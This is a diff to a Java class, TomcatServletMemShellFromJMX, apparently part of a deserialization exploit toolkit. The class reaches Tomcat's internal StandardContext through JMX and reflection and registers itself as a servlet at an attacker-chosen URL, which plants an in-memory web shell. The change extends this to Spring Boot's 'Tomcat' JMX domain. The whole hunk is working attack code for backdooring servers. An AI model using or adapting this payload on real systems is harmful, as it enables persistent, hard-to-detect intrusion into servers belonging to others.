@@ -47,29 +47,29 @@ public class TomcatServletMemShellFromJMX extends AbstractTranslet implements Se
             Repository repository = (Repository) field.get(obj);
 
             Set<NamedObject> objectSet = repository.query(new ObjectName("Catalina:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
+            if (objectSet.size() == 0) {
+                // springboot的jmx中为Tomcat而非Catalina
+                objectSet = repository.query(new ObjectName("Tomcat:host=localhost,name=NonLoginAuthenticator,type=Valve,*"), null);
+            }
             for (NamedObject namedObject : objectSet) {
-                try {
-                    DynamicMBean dynamicMBean = namedObject.getObject();
-                    field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
-                    field.setAccessible(true);
-                    obj = field.get(dynamicMBean);
+                DynamicMBean dynamicMBean = namedObject.getObject();
+                field = Class.forName("org.apache.tomcat.util.modeler.BaseModelMBean").getDeclaredField("resource");
+                field.setAccessible(true);
+                obj = field.get(dynamicMBean);
 
-                    field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
-                    field.setAccessible(true);
-                    StandardContext standardContext = (StandardContext) field.get(obj);
+                field = Class.forName("org.apache.catalina.authenticator.AuthenticatorBase").getDeclaredField("context");
+                field.setAccessible(true);
+                StandardContext standardContext = (StandardContext) field.get(obj);
 
-                    if (standardContext.findChild(servletName) == null) {
-                        Wrapper wrapper = standardContext.createWrapper();
-                        wrapper.setName(servletName);
-                        standardContext.addChild(wrapper);
-                        Servlet servlet = new TomcatServletMemShellFromJMX();
-                        wrapper.setServletClass(servlet.getClass().getName());
-                        wrapper.setServlet(servlet);
-                        ServletRegistration.Dynamic registration = new ApplicationServletRegistration(wrapper, standardContext);
-                        registration.addMapping(urlPattern);
-                    }
-                } catch (Exception e) {
-                    // e.printStackTrace();
+                if (standardContext.findChild(servletName) == null) {
+                    Wrapper wrapper = standardContext.createWrapper();
+                    wrapper.setName(servletName);
+                    standardContext.addChild(wrapper);
+                    Servlet servlet = new TomcatServletMemShellFromJMX();
+                    wrapper.setServletClass(servlet.getClass().getName());
+                    wrapper.setServlet(servlet);
+                    ServletRegistration.Dynamic registration = new ApplicationServletRegistration(wrapper, standardContext);
+                    registration.addMapping(urlPattern);
                 }
             }
         } catch (Exception e) {
